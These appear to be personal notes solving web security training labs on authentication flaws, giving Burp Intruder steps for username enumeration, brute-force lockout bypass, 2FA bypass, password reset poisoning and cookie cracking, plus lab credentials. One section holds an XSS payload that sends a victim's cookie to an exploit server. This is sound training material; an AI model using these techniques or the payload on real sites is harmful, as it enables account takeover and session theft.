### Username enumeration via different responses

username:austin
password:football

---
### 2FA simple bypass

Log in the wiener account. Then check the url `/my-account` then enter with carlos montoya, and navigate manually to that endpoint. 

---
### Password reset broken logic

Complete all the forgot password flow, and in the `/forgot-password?temp-forgot-password-token=TOKEN` and replace the username in the body for the "carlos" one.

Replace the password, and log into his account.

---
### Username enumeration via subtly different responses

In the Intruder settings, select "Grep - Extract" and select "Invalid username or password.". Send the attack, and you'll see there is a different one. 
username: ad
password: klaster

---
### Username enumeration via response timing

Add the "Response completed" column, and filter for the time the answer took to complete. Bare in mind I'm using a password 100 characters long. 

username: atlas
password: 1234

---
### Broken brute-force protection, IP block

Here the application will block you for 1 minute if you try to bruteforce. But this timer resets if you input valid credentials. So, to brute force the user "carlos" create a payload like this 

```text
wiener
carlos
wiener
carlos
```

and use a password payload switching with the correct password for wiener. So for each time this happens, it'll reset the blocker.

```text
peter
123
peter
asdasd
```

username: carlos
password: hunter

---
### Username enumeration via account lock

1. With Burp running, investigate the login page and submit an invalid username and password. Send the `POST /login` request to Burp Intruder.
2. Select the attack type **Cluster bomb**. Add a payload position to the `username` parameter. Add a blank payload position to the end of the request body by clicking **Add §** twice. The result should look something like this:
`username=§invalid-username§&password=example§§`
3. On the **Payloads** tab, add the list of usernames to the first payload set. For the second set, select the **Null payloads** type and choose the option to generate 5 payloads. This will effectively cause each username to be repeated 5 times. Start the attack.
4. In the results, notice that the responses for one of the usernames were longer than responses when using other usernames. Study the response more closely and notice that it contains a different error message: `You have made too many incorrect login attempts.` Make a note of this username.
5. Create a new Burp Intruder attack on the `POST /login` request, but this time select the **Sniper** attack type. Set the `username` parameter to the username that you just identified and add a payload position to the `password` parameter.
6. Add the list of passwords to the payload set and create a grep extraction rule for the error message. Start the attack.
7. In the results, look at the grep extract column. Notice that there are a couple of different error messages, but one of the responses did not contain any error message. Make a note of this password.
8. Wait for a minute to allow the account lock to reset. Log in using the username and password that you identified and access the user account page to solve the lab.

athena:soccer

---
### 2FA broken logic

Copy the /login2 POST, send to intruder. Change the verify with "carlos" instead of wiener. 

and add as a body: `mfa-code=1234`

The 1234 will be your payload position on the intruder. Send it. As soon as you have the 302, show response in browser. You're in.

---
### Brute-forcing a stay-logged-in cookie

Click on the "Stay logged in" option when logging in. Inspect the cookie assigned on the inspector, and see it's "wiener:51dc30ddc473d43a6011e9ebba6ca770"

It's a good guess to say the cookie is being constructed like this:
`base64(username+':'+md5HashOfPassword)`

Si, in the intruder, replace your name in the queryString in /my-account?id=wiener with "carlos", and add a payload position in the stay-logged-in cookie.

Add the list of passwords as payloads, and in "Payload processing" set it like this:
![[Pasted image 20240731004425.png]]

And in settings, set a "Grep Match" with "Update email".

Start the attack. You should see a 200 response. 

---
### Offline password cracking

Notice the "stay-logged-in" cookie is Base64 encoded.
`d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw` => `wiener:51dc30ddc473d43a6011e9ebba6ca770`

Notice the "comment" is vulnerable to XSS. 
This is you payload to exfiltrate the victim's cookie:

`<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`

In the access log, you should see the cookie. After decode it from base64, and paste the hash in crackstation, you have `carlos:onceuponatime`

---
### Password reset poisoning via middleware

After investigating the "password reset" functionality, you can see there is a link containing a unique reset token is sent via email.

Notice the "X-Forwarded-Host" is allowed, so you can send the response to any host. Set it to point to the exploit server.

You should receive the `temp-forgot-password-token` value. Take the request pointing to GET /forgot-password?temp-forgot-password-token= and paste this received value.
Open this request in the browser.

Change the password and login as Carlos

---
### Password brute-force via password change

Observe that the username is submitted as hidden input in the request. This means when you change the password, even though is asking just for the passwords, it also sends the username.

If you enter a wrong current password, it says "Current password is incorrect" and if mew passwords don't match, it says "New passwords do not match".

Use this errors to brute force the password for carlos. Send the POST /my-account/change-password to intruder, with this body:

`username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc`

Payload list is the one the lab gives, and add a grep match "New passwords do not patch".

Your password is "thunder"

